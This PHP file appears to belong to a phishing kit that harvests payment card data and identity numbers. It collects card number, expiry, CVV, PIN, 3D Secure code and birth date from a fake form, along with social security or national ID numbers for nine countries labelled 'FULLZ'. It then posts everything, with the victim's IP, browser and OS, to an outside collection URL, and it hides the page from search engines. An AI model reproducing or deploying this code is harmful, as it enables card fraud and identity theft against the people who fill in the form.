<?php
header("X-Robots-Tag: noindex, nofollow", true);
session_start();
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);
$pin2="";
$AUosid="";
$USssn="";
$CAsin="";
$UKnin="";
$ITfcn="";
$IRirpps="";
$BRcpfbr="";
$NLbsn="";
$ESdni="";
$SEsid="";
if( isset($_POST['cardnumberInput'])  && isset($_POST['expirationInput']) && isset($_POST['cardcodeInput']) ){

if (trim($_SESSION['CountryName']) == "United States"){
	$USssn .="<span style='color: #55FF55;'>$ SocialSecurityNum~:</span>  ".$_POST['SSN']." 
	
	";} 
if (trim($_SESSION['CountryName']) == "Canada"){
	$CAsin .="<span style='color: #55FF55;'>$ SocialInsuranceNum~:</span>  ".$_POST['SIN']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "United Kingdom"){
	$UKnin .="<span style='color: #55FF55;'>$ NationalInsuranceNum~:</span> ".$_POST['NIN']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Italy"){
	$ITfcn .="<span style='color: #55FF55;'>$ FiscalCodiceNum~:</span>  ".$_POST['FCN']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Ireland"){
	$IRirpps .="<span style='color: #55FF55;'>$ PersonalPublicService~:</span>  ".$_POST['IRPPS']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Brazil"){
	$BRcpfbr .="<span style='color: #55FF55;'>$ AdastroPessoasFísicas~:</span>  ".$_POST['CPFBR']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Netherlands"){
	$NLbsn .="<span style='color: #55FF55;'>$ BurgerServiceNummer~:</span>  ".$_POST['BSN']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Spain"){
	$ESdni .="<span style='color: #55FF55;'>$ NationalIdentityDoc~:</span>  ".$_POST['DNI']." 	
	
	";} 
if (trim($_SESSION['CountryName']) == "Sweden"){
	$SEsid .="<span style='color: #55FF55;'>$ PersonNummer~:</span>  ".$_POST['SID']." 	
	
	";} 
        
if (!empty($_POST['pin1'])){
    $pin2 .= "<span style='color: #55FF55;'>$ Card PIN~:</span>  ".$_POST['pin1']." 
	
	";
}
if (!empty($_POST['OSID'])){
    $AUosid .= "<span style='color: #55FF55;'>$ OSID~:</span>  ".$_POST['OSID']." 
	
	";
}        
       

     } 
	 /*
$localrez ="###################################################
###################################################       
=-=-=-=-=-=-=-=-=-=- ♣ FULLZ ♣ =-=-=-=-=-=-=-=-=-=-

".$_POST['cc1type']." ".$_POST['cardnumberInput']."		   
Birth Date: ".$_POST['birthdateInput']."
3D Secure: ".$_POST['secure_CC1Input']."
Card PIN: ".$_POST['pin1']."
SocialSecurityNum: ".$_POST['SSN']."		   
SocialInsuranceNum: ".$_POST['SIN']."
NationalInsuranceNum: ".$_POST['NIN']."
FiscalCodiceNum: ".$_POST['FCN']."
PersonalPublicService: ".$_POST['IRPPS']."
AdastroPessoasFísicas: ".$_POST['CPFBR']."
BurgerServiceNummer: ".$_POST['BSN']."
NationalIdentityDoc: ".$_POST['DNI']."
PersonNummer: ".$_POST['SID']."
		   
=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-=-	

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-=--=-=-=- ♣ ☠ Dr Hard ☠ ♣ =-=-=-=-=-=-=-=-=-
";
	
$localr3z = fopen("../../../REZLT/tnt4.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);	 
		
		
		*/
		
		
		//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $DATE;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = $browserTy_Version;
$data['os'] = $OS;

sendPost('http://www.save-test.epizy.com/sc2/sv4.php',$data);


//---- end request----------------
		
		
		
?>